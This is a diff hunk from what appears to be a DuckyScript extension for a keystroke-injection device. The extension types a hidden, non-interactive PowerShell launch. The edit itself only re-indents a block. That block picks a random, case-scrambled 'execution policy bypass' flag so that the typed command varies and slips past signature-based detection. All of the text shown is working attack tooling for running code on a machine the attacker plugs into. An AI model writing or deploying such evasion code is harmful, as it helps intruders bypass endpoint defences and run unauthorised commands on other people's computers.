@@ -103,24 +103,24 @@ EXTENSION Rolling_Powershell_Execution
             STRING powershell.exe -noP -nOnI -windo H
         END_IF
 
-    IF_DEFINED #EXECUTIONPOLICY
-        SPACE
-        IF (($RANDOM_PS % 2) == 0) THEN
-            STRING -ep ByPasS
-        ELSE IF (($RANDOM_PS % 5) == 0) THEN
-            STRING -exec bypass
-        ELSE IF (($RANDOM_PS % 7) == 0) THEN
-            STRING -exeC byPasS
-        ELSE IF (($RANDOM_PS % 10) == 0) THEN
-            STRING -exEcUtionPoL bYpaSs
-        ELSE IF (($RANDOM_PS % 12) == 0) THEN
-            STRING -exEcUtion bYPaSs
-        ELSE
-            STRING -eP BYPaSs
-        END_IF
-    END_IF_DEFINED
-    ENTER
-    DELAY #DELAY
+        IF_DEFINED #EXECUTIONPOLICY
+            SPACE
+            IF (($RANDOM_PS % 2) == 0) THEN
+                STRING -ep ByPasS
+            ELSE IF (($RANDOM_PS % 5) == 0) THEN
+                STRING -exec bypass
+            ELSE IF (($RANDOM_PS % 7) == 0) THEN
+                STRING -exeC byPasS
+            ELSE IF (($RANDOM_PS % 10) == 0) THEN
+                STRING -exEcUtionPoL bYpaSs
+            ELSE IF (($RANDOM_PS % 12) == 0) THEN
+                STRING -exEcUtion bYPaSs
+            ELSE
+                STRING -eP BYPaSs
+            END_IF
+        END_IF_DEFINED
+        ENTER
+        DELAY #DELAY
     END_FUNCTION
     REM EXAMPLE USAGE AFTER EXTENSION
     REM DELAY 2000
